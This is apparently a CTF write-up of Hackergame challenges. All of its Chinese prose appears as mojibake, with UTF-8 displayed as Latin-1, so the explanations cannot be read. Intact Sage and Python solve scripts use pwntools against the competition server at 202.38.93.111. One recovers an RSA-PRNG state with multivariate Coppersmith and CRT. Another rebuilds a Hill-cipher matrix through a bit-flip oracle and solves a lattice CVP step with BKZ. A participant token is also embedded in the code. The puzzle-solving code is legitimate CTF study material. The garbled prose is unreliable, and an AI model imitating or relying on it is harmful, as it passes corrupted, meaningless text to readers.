æœ¬åœºæ¯”èµ›æœ€é—æ†¾çš„ä¸€é“é¢˜ã€‚å¦å¤–4é“mathåšå‡ºäº†3.5é“ï¼Œå´ååå‰©äº†è¿™é“åšå‡ºäººæ•°å¾ˆå¤šçš„é¢˜çˆ†é›¶â€¦â€¦ååˆ†éš¾å—  

è™½ç„¶æ„è¯†åˆ°é¢˜ç›®çš„ç®—æ³•ä¸€å®šå¯¹åº”ä¸€ä¸ªæœ‰æ„ä¹‰çš„æ•°å­¦é—®é¢˜ï¼Œä½†å…¨ç¨‹ä¸€ç›´æ²¡çœ‹å‡ºæ¥è¿™æ˜¯ç©ºé—´ç«‹æ–¹ä½“å¡«å……ï¼Œè‡ªç„¶ä¹Ÿå°±æ— ä»ä¸‹æ‰‹ã€‚  

ä¹Ÿè€ƒè™‘è¿‡ç”¨z3ï¼Œä½†æ²¡æƒ³æ˜ç™½stage3çš„sortåº”è¯¥æ€ä¹ˆè½¬æ¢ï¼ˆèµ›åçœ‹writeupåŸæ¥ç›´æ¥æšä¸¾å„ç§æƒ…å†µç”¨Orè¿æ¥å°±è¡Œäº†ï¼Ÿï¼Ÿè€Œä¸”èƒ½é€šè¿‡å…¨éƒ¨3å…³ï¼Ÿï¼Ÿï¼‰  

## é»‘å®¢é©¬æ‹‰æ¾ ï¼ˆéƒ¨åˆ†å®Œæˆï¼‰

```
é»‘å®¢é©¬æ‹‰æ¾ math     550 16 (17)
    æ•™ç»ƒï¼Œæœ‰äººæŠ¢è·‘ï¼ 300 16
    ä¸€ç™ºå‹è²         250 17
```

æˆ‘å°±æ˜¯é‚£å”¯ä¸€ä¸€ä½åšå‡ºç¬¬äºŒå…³ä¸ä¼šç¬¬ä¸€å…³çš„â€¦â€¦  

å– e = phi - 1 ï¼Œåˆ™ state * pow(state, e, n) % n = pow(state, phi, n) = 1  
eå¾ˆå¤§ï¼Œæ‰€ä»¥ k = 1024 - 96  
ä¸Šå¼ä¸­stateæ˜¯96ä½çš„æ•°ï¼Œpow(state, e, n)æ˜¯1024ä½çš„æ•°ä½†åªæœ‰æœ€é«˜çš„96ä½æœªçŸ¥ï¼Œæ‰€ä»¥ä¸Šé¢çš„ç­‰å¼ç›¸å½“äºåªæœ‰ä¸¤ä¸ªä½æ•°ä¸è¶…è¿‡96çš„æœªçŸ¥é‡ï¼Œè€Œæ¨¡æ•°nçš„ä½æ•°é«˜è¾¾1024ï¼ŒæœªçŸ¥é‡çš„ä½æ•°è¿œå°äºæ¨¡æ•°ï¼Œå¯ä»¥ç”¨å¤šå˜é‡coppersmithæ±‚è§£ã€‚  
ä½¿ç”¨äº† https://github.com/defund/coppersmith/blob/master/coppersmith.sage æä¾›çš„å¤šå˜é‡coppersmithç®—æ³•å®ç°ï¼Œå…¶æ¨¡æ•°è¦æ±‚å¿…é¡»æ˜¯è´¨æ•°ï¼Œè¿™é‡Œåªè¦æŠŠnåˆ†è§£ä¸ºpã€qåˆ†åˆ«æ±‚è§£å†ç”¨ä¸­å›½å‰©ä½™å®šç†åˆå¹¶å³å¯ã€‚  

ç›¸åŒçš„æ–¹æ³•è¿‡ä¸äº†ç¬¬ä¸€å…³ï¼Œå› ä¸ºæ— æ³•é€šè¿‡ä»£ç ä¸­ `math.gcd(states[i] - state, N) == 1` çš„å¾ªç¯æ£€æŸ¥ã€‚  
ä¹ŸæŸ¥åˆ°äº†rsa prngã€Micali-Schnorr prngï¼Œä»¥åŠä¸€ç¯‡è®ºæ–‡ [On the Possibility of a Backdoor in the Micali-Schnorr Generator](https://eprint.iacr.org/2023/440 ) å’Œ [ä»£ç å®ç°](https://github.com/ucsd-hacc/msdrbg_code )ï¼Œä½†çœ‹ä¸å¤ªæ˜ç™½ï¼Œä¹Ÿæ²¡æƒ³é€šå¦‚ä½•æ„é€ ç­‰å¼é€šè¿‡coppersmithæ±‚è§£ã€‚  

æ­¤å¤–ï¼Œé¢˜ç›®è¦æ±‚çš„pã€qä¸¤ä¸ªå¼ºè´¨æ•°çš„ç”Ÿæˆä¹Ÿå¡äº†ä¸å°‘æ—¶é—´ã€‚æœ€åˆè€ƒè™‘çš„æ˜¯å…ˆç”Ÿæˆè´¨æ•°på†æ£€æŸ¥(p-1)/2çš„å¤§è´¨å› å­ï¼Œä½†æ˜¯æ ¹æœ¬è·‘ä¸åŠ¨ï¼›åæ¥æ‰æƒ³åˆ°ç›´æ¥ç”Ÿæˆè´¨æ•°lfpä½œä¸º(p-1)/2ï¼Œå†æ£€æŸ¥p=lpf\*2+1æ˜¯å¦ä¸ºè´¨æ•°ï¼Œå¾ˆå¿«å°±èƒ½æ‰¾åˆ°ä¸¤ä¸ªç¬¦åˆè¦æ±‚çš„è´¨æ•°pã€qã€‚  

sageä»£ç ï¼š
```python
# https://github.com/defund/coppersmith/blob/master/coppersmith.sage

import itertools

def small_roots(f, bounds, m=1, d=None):
        if not d:
                d = f.degree()

        if isinstance(f, Polynomial):
                x, = polygens(f.base_ring(), f.variable_name(), 1)
                f = f(x)

        R = f.base_ring()
        N = R.cardinality()

        f /= f.coefficients().pop(0)
        f = f.change_ring(ZZ)

        G = Sequence([], f.parent())
        for i in range(m+1):
                base = N^(m-i) * f^i
                for shifts in itertools.product(range(d), repeat=f.nvariables()):
                        g = base * prod(map(power, f.variables(), shifts))
                        G.append(g)

        B, monomials = G.coefficient_matrix()
        monomials = vector(monomials)

        factors = [monomial(*bounds) for monomial in monomials]
        for i, factor in enumerate(factors):
                B.rescale_col(i, factor)

        B = B.dense_matrix().LLL()

        B = B.change_ring(QQ)
        for i, factor in enumerate(factors):
                B.rescale_col(i, 1/factor)

        H = Sequence([], f.parent().change_ring(QQ))
        for h in filter(None, B*monomials):
                H.append(h)
                I = H.ideal()
                if I.dimension() == -1:
                        H.pop()
                elif I.dimension() == 0:
                        roots = []
                        for root in I.variety(ring=ZZ):
                                root = tuple(R(root[var]) for var in f.variables())
                                roots.append(root)
                        return roots

        return []


import ast
import random
import math
import sympy
from Crypto.Util.number import getPrime, getStrongPrime


def getprime_and_lf(bit_count):
    while True:
        lfp = getPrime(bit_count - 1)
        p = 2 * lfp + 1
        if sympy.isprime(p):
            assert int(p).bit_length() == bit_count, int(p).bit_length()
            return p, lfp

#p, lfp = getprime_and_lf(512)
#q, lfq = getprime_and_lf(512)
p, lfp = 10284964423277086781324646162797444948286735987210973268291637934982461017403266491517131914591936783189564830908678379292104063404374510956134416734532283, 5142482211638543390662323081398722474143367993605486634145818967491230508701633245758565957295968391594782415454339189646052031702187255478067208367266141
q, lfq = 10915896047167696332216890728349359832094851512246844563429798011757612997994676280284416871214719712172628555929494696167274705179563157213424879235977027, 5457948023583848166108445364174679916047425756123422281714899005878806498997338140142208435607359856086314277964747348083637352589781578606712439617988513

n = p * q
phi = (p-1) * (q-1)
e = phi - 1
d = pow(e, -1, phi)

Nbits = int(n).bit_length()
assert Nbits == 1024

assert int(d).bit_length() > 0.292*Nbits

k = Nbits - max(int(Nbits*2/e), 96)
assert k == 1024 - 96


from pwn import *

# s = process("python3 rsa_prng.py", shell=True)
s = remote("202.38.93.111", 20230)
s.sendlineafter(b"Please input your token: ", b"36:MEUCIQDRBrTZvTOdMDiPuXZcFiw8M7EYMjRhTNNmEEp5WczQ1QIgOFiC/wdfGxpZSfqcGRxSkQyG+6Tg9zGFKP4MiOMhaJA=")

s.sendlineafter(b"p: ", str(p).encode())
s.sendlineafter(b"q: ", str(q).encode())
s.sendlineafter(b"A large prime factor of p-1: ", str(lfp).encode())
s.sendlineafter(b"A large prime factor of q-1: ", str(lfq).encode())
s.sendlineafter(b"e: ", str(e).encode())
s.sendlineafter(b"Choose mission: ", b"2")
r = s.recvline()
print(r)

b = ast.literal_eval(r.decode())[0]

P.<x, y> = PolynomialRing(GF(p))
f = x * (y * a + b) - 1
bounds = (1<<96, 1<<96)
r = small_roots(f, bounds)
print(r)
s1_p = (r[0][1] << k) + b
print(s1_p)
print(pow(r[0][0], e, n))

P.<x, y> = PolynomialRing(GF(q))
f = x * (y * a + b) - 1
bounds = (1<<96, 1<<96)
r = small_roots(f, bounds)
print(r)
s1_q = (r[0][1] << k) + b
print(s1_q)
print(pow(r[0][0], e, n))

s1 = CRT(int(s1_p), int(s1_q), p, q)

s.sendlineafter(b"Predict PRNG state: ", str(s1).encode())
r = s.recv()
print(r)
print(r.decode())
s.interactive()
```


## ä¸å¯åŠ å¯†çš„å¼‚ä¸–ç•Œ 2

ç¬¬ä¸€å…³æ³¨æ„åˆ°ä½œä¸ºå¼‚æˆ–keyçš„flag1ï¼Œæ¯ä¸ªå­—èŠ‚çš„æœ€é«˜ä½æ°¸è¿œä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ç»„è¾“å…¥åªæœ‰å…¶ä¸­ä¸€ä¸ªå­—èŠ‚çš„æœ€é«˜ä½bitä¸åŒï¼Œå®ƒä»¬åˆ†åˆ«å¼‚æˆ–flag1åä»ç„¶åªæœ‰è¿™ä¸ªbitä¸åŒã€‚è€Œåªæœ‰æœ€é«˜ä½bitä¸åŒç­‰åŒäºåŠ å‡128ï¼Œä¸¤æ¬¡çš„ç­‰å¼ç›¸å‡å³å¯æ¶ˆé™¤å¼‚æˆ–flag1çš„éƒ¨åˆ†ï¼Œåªå‰©ä¸‹ä¸€ä¸ªå­—èŠ‚æ˜¯128ï¼Œå…¶ä»–éƒ½æ˜¯0ï¼Œå°±å¯ä»¥æ±‚å‡ºå¸Œå°”çŸ©é˜µçš„ä¸€ä¸ªåˆ—ã€‚é‡å¤128æ¬¡å³å¯æ¢å¤å®Œæ•´çš„çŸ©é˜µã€‚  
æ³¨æ„æºç æ— æ³•åŒºåˆ†0å’Œ256ï¼Œå› æ­¤å¦‚æœæœåŠ¡å™¨è¿”å›çš„å€¼åŒ…å«0ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆã€‚å®æµ‹æ€»å…±400æ¬¡æ˜¯è¶³å¤Ÿçš„ã€‚  

ç¬¬äºŒå…³åˆ—å‡ºçŸ©é˜µæ–¹ç¨‹å³å¯å‘ç°åªéœ€è¦æ±‚è§£å¸Œå°”çŸ©é˜µå‡å»å•ä½çŸ©é˜µåå¾—åˆ°çš„çŸ©é˜µçš„é0è§£ã€‚  

ç¬¬ä¸‰å…³åœ¨ç¬¬äºŒå…³çš„åŸºç¡€ä¸Šè¦æ±‚è§£åœ¨å¯è§å­—ç¬¦èŒƒå›´å†…ã€‚ç¬¬äºŒå…³å®é™…ä¸Šå¯ä»¥å¾—å‡ºé€šè§£ï¼ŒæŒ‰ç…§é«˜æ–¯æ¶ˆå…ƒçš„é€»è¾‘ï¼Œé€šè§£æ˜¯è‹¥å¹²ä¸ªå‘é‡çš„çº¿æ€§ç»„åˆã€‚ç›®æ ‡æ˜¯æ‰¾åˆ°è¿™äº›çº¿æ€§ç»„åˆä¸­æ¯”è¾ƒæ¥è¿‘å¯è§å­—ç¬¦èŒƒå›´çš„ä¸€ä¸ªè§£ï¼Œè¿™å°±æ˜¯æ ¼ä¸Šcvpé—®é¢˜çš„åŸå§‹å®šä¹‰ã€‚  
å¯è§å­—ç¬¦çš„èŒƒå›´æ˜¯0x20åˆ°0x7fä¹‹é—´ï¼Œå–ä¸­å€¼79ä½œä¸ºcvpçš„ç›®æ ‡å‘é‡ï¼Œä¸é€šè§£çº¿æ€§ç»„åˆå‘é‡å’Œæ¨¡æ•°257ä¸€èµ·æ„é€ æ ¼çŸ©é˜µï¼Œç”¨BKZç®—æ³•åšæ ¼åŸºè§„çº¦ï¼ˆå®æµ‹LLLç®—æ³•éš¾ä»¥æ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„è§£ï¼‰ï¼Œæ‰¾åˆ°ä¸­å€¼79åªè¢«å‡å»ä¸€æ¬¡çš„è¡Œï¼ŒæŠŠè¿™è¡ŒåŠ ä¸Š79ï¼Œå³æ˜¯è¿™äº›å‘é‡çº¿æ€§ç»„åˆä¸­æ¯”è¾ƒæ¥è¿‘ä¸­å€¼79çš„å‘é‡ï¼Œå¯ä»¥ä½œä¸ºç¬¬ä¸‰å…³çš„ç­”æ¡ˆã€‚  

pythonä»£ç ï¼š
```python
import ast
import string
import random
import os
from pwn import *


def xor(b1:bytes, b2:bytes):
    assert len(b1) == len(b2)
    return bytes([ i^j for i,j in zip(b1,b2)])

def pad(msg:bytes, target_len):
    return msg + "".join([random.choice(string.printable) for _ in range(target_len - len(msg))]).encode()


# s = process("sage unencryptable_world2.sage", shell=True)
s = remote("202.38.93.111", 22000)
s.sendlineafter(b"Please input your token:", b"<>")

s.recvuntil(b"[+] please give me some hex input (128 bytes) such as 77656c636f6d65 and I will check encrypt-ability for you.")


def oracle(buf):
    global s
    s.sendlineafter(b">", buf.hex().encode())
    s.recvuntil(b"[+] you ciphertext : ")
    r = s.recvline()
    r = r.strip().decode()
    assert len(r) == 256
    msg = bytes.fromhex(r[:256])
    if any(m == 0 for m in msg):
        return None
    return msg

def findvalidbuf():
    while True:
        buf = pad(b"", 128)
        msg = oracle(buf)
        if msg:
            return buf, msg


data = [None] * 128

count = 0
while count < 128:
    print("tttt", count)
    buf, msg = findvalidbuf()
    for i in range(128):
        if not data[i]:
            buf2 = bytearray(buf)
            buf2[i] ^= 0x80
            msg2 = oracle(buf2)
            if msg2:
                data[i] = (buf, msg, buf2, msg2)
                count += 1

matrix = [[None]*128 for _ in range(128)]

for i, (buf, msg, buf2, msg2) in enumerate(data):
    col = [(((msg2[j]-msg[j]) % 257) * pow(128, -1, 257)) % 257 for j in range(128)]
    for j in range(128):
        matrix[j][i] = col[j]

print(matrix)

with open("tmp_data.txt", "w") as f:
    f.write(str(matrix) + "\n")
    f.write(str(list(data[0][1])) + "\n")

os.system("sage solve_matrix.sage")

with open("tmp_solve_result.txt", "r") as f:
    lines = f.readlines()

buff = ast.literal_eval(lines[0])
t = ast.literal_eval(lines[1])

flag = xor(data[0][0], buff)
print(flag)


s.sendlineafter(b">", bytes(t).hex())
s.interactive()
```

å…¶ä¸­æ–¹ç¨‹æ±‚è§£å’Œæ ¼è§„çº¦éƒ¨åˆ†çš„sageä»£ç ï¼š  
```python
import ast

with open("tmp_data.txt", "r") as f:
    lines = f.readlines()

m_ = ast.literal_eval(lines[0])
msg_ = ast.literal_eval(lines[1])


base_mod = 2**8 + 1
base_ring = GF(base_mod)

m = matrix(base_ring, m_)
v = vector(base_ring, msg_)

r = m.solve_right(v)

r_ = list(int(c) for c in r)



a = m - matrix.identity(base_ring, 128)

print(a.rank())

# https://ask.sagemath.org/question/31009/linear-equations-with-infinite-solutions/

t = a.solve_right(vector(base_ring, [0]*128))
k = a.right_kernel()
basises = list(k.basis())
b1 = basises[0]

print(t)
print(k)

while True:
    t += b1
    t_ = list(int(c) for c in t)
    if all(c < 256 for c in t_):
        break

assert m*t == t
print(t)


basis_count = len(basises)
print(basis_count)

ttt = block_matrix(
    [
        [matrix(ZZ, basises), matrix.zero(ZZ, basis_count, 1)],
        [matrix.identity(ZZ, 128) * 257, matrix.zero(ZZ, 128, 1)],
        [matrix(ZZ, [79]*128), 1],
    ],
    subdivide=False
)

rrr = ttt.BKZ()

print(rrr)

t_ = None
for row in rrr:
    if row[-1] == -1:
        t_ = [79+row[i] for i in range(128)]
        if all(0x20 <= c < 0x7f for c in t_):
            break
        else:
            t_ = None

print(t_)
print(bytes(t_))
t = vector(base_ring, t_)
assert m*t == t


with open("tmp_solve_result.txt", "w") as f:
    f.write(str(r_) + "\n")
    f.write(str(t_) + "\n")

```

æœ‰ä¸€ç‚¹å¾ˆä¸ç†è§£ï¼Œå¸Œå°”ä¹‹ç§˜å°±æ˜¯æ ¼cvpé—®é¢˜çš„ç›´æ¥åº”ç”¨ï¼Œæ€»æ¯”é»‘å®¢é©¬æ‹‰æ¾ç¬¬ä¸€å…³è¦è‡ªå·±æ„é€ coppersmithç®€å•å¤šäº†å§â€¦â€¦ä¸ºä»€ä¹ˆåšå‡ºäººæ•°åè€Œå°‘äº†3ä¸ªï¼Ÿï¼Ÿ  

## æ—§æ—¥ä¹‹ç—• ï¼ˆæœªå®Œæˆï¼‰

C++ + llvm + å»ç¬¦å·ï¼Œè¿™ç§bufæ‹‰æ»¡çš„åšæ³•å‡ºåœ¨hackergameä¸­ï¼Œæƒ³å¿…æ˜¯é˜²akå§ï¼ˆè™½ç„¶æ²¡è¾¾åˆ°ç›®æ ‡ï¼‰  

é¢˜ç›®æ€è·¯å¾ˆæ–°é¢–ï¼Œåœ¨ç¼–è¯‘åçš„äºŒè¿›åˆ¶ä¸­è—æ°´å°ï¼ˆIDAæœ¬ä½“åº”è¯¥ç”¨äº†ç±»ä¼¼çš„æŠ€æœ¯ï¼‰ï¼Œä½†é€†å‘ä¸æ˜¯ä¸€èˆ¬çš„ç—›è‹¦ï¼ˆä»¥è‡³äºèµ›ç¨‹å‰æœŸæ ¹æœ¬ä¸æƒ³é€†ï¼ŒåæœŸç›´æ¥æ‘†çƒ‚æ›´ä¸æƒ³é€†ï¼‰  

ä¸è¿‡æ ¹æ®libbw.soè°ƒç”¨çš„llvmç›¸å…³çš„å‡½æ•°ä¹Ÿèƒ½å¤§è‡´çŒœå‡ºå¯èƒ½çš„é€»è¾‘ï¼šè¾“å…¥æŒ‰bitæ‹†åˆ†ï¼Œåšä¸€ä¸ªè‚¯å®šæœ‰åŠæ³•æ¢å¤çš„éšæœºæ‰“ä¹±ï¼Œæœ€åä¼ é€’åˆ°sub_9313ä¸­å‚ä¸llvm::BasicBlock::moveAfterå‡½æ•°çš„è°ƒç”¨ï¼Œæ‰€ä»¥éšè—secretçš„æ–¹æ³•å°±æ˜¯æ ¹æ®æ¯ä¸ªbitçš„å€¼æ”¹å˜å„ä¸ªåŸºæœ¬å—çš„é¡ºåºã€‚  

æ¢å¤çš„æ–¹æ³•å¤§æ¦‚åº”è¯¥æ˜¯å…ˆé€†æ¸…æ¥šåŸºæœ¬å—é¡ºåºçš„äº¤æ¢ä¸è¾“å…¥çš„secretçš„å„ä¸ªbitçš„å…³ç³»ï¼Œç„¶åé€†å‘ç»™å‡ºçš„äºŒè¿›åˆ¶æ‰¾å‡ºå„ä¸ªåŸºæœ¬å—å’Œé¡ºåºï¼Œæœ€åé€†æ¨å¾—åˆ°secretã€‚ç¨å¾®æƒ³æƒ³å°±æ„Ÿè§‰å¤æ‚åˆ°å¤´å¤§ï¼Œè€Œä¸”èµ›æœŸå†…ä¸ªäººç©ºé—²æ—¶é—´æœ‰é™å¾ˆéš¾æ‰¾å‡ºè¿™ä¹ˆé•¿çš„æ—¶é—´æ”»å…‹è¿™é“é¢˜ï¼Œåªå¥½æ”¾å¼ƒï¼ˆé¢˜ç›®æ€è·¯å¾ˆèµï¼Œå¦‚æœçœŸçš„åšå‡ºæ¥æ”¶è·åº”è¯¥è›®å¤§çš„ï¼‰ã€‚  

# åè®°

å†™writeupæ˜¯ä¸€ä»¶å¾ˆç´¯äººçš„äº‹æƒ…\^\^vv\<\>\<\>  ï¼Œä½†ä½œä¸ºå‚èµ›çš„å¤ç›˜æ€»ç»“è¿˜æ˜¯æœ‰å¿…è¦å†™çš„  

æœ€åï¼Œæ¬¢è¿åœ¨åŒåä¸€å‚åŠ  [0CTF](https://ctf.0ops.sjtu.cn ) ï¼ˆNov 11 2023, 10:00 UTC+8ï¼‰  
ï¼ˆå¹³å°æ‰“ä¸å¼€ï¼Ÿå—¯...å°é“æ¶ˆæ¯ï¼Œä»Šå¹´çš„å¹³å°è¿ç»´è¿ç€æ‰“äº†geekgameå’Œhackergameâ€¦â€¦ï¼‰  
